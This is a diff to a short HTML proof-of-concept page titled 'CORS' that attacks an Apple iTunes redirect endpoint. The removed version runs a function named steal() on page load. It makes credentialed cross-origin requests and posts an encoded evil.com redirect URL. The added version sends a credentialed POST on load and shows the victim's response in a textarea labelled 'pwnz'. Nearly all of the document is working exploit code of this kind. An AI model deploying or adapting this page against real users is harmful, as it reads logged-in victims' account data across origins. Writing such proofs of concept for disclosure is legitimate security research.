@@ -1,19 +1,23 @@
 <!DOCTYPE html>
 <html>
 <head><title>CORS</title></head>
+<body onload="cors();">
+<center>
+cors proof-of-concept:<br><br>
+<textarea rows="10" cols="60" id="pwnz">
+</textarea><br>
+</div>
+
 <script>
-function steal(){
-var xmlH = new XMLHttpRequest();
-xmlH.open("GET", "https://itunes.apple.com/WebObjects/MZStoreServices.woa/wa/processRedirectUrl", true);
-xmlH.withCredentials = true;
-xmlH.send();
-xmlH.onload = function(){
-data = JSON.parse(this.responseText);
-var xhr = new XMLHttpRequest();
-xhr.open("POST", "https://itunes.apple.com/WebObjects/MZStoreServices.woa/wa/processRedirectUrl", true);
-xhr.setRequestHeader("Content-Type", "application/json");
-xhr.send('https%3A%2F%2Fevil.com%2Fus%2Fbook%2Fthe-fifth-witness%2Fid395519191%3FEmail_OID%3D1a059baaa95f18c923861806206b16b2%26Email_PageName%3DP0009647-%26at%3D10lIEQ%26ct%3Dlink%26itscg%3D30200%26itsct%3Dbooks_toolbox%26ls%3D1%26uo%3D4');
-}
+function cors() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("pwnz").innerHTML = this.responseText;
+    }
+  };
+  xhttp.open("POST", "https://itunes.apple.com/WebObjects/MZStoreServices.woa/wa/processRedirectUrl", true);
+  xhttp.withCredentials = true;
+  xhttp.send();
 }
 </script>
-<body onload="steal()"></body>
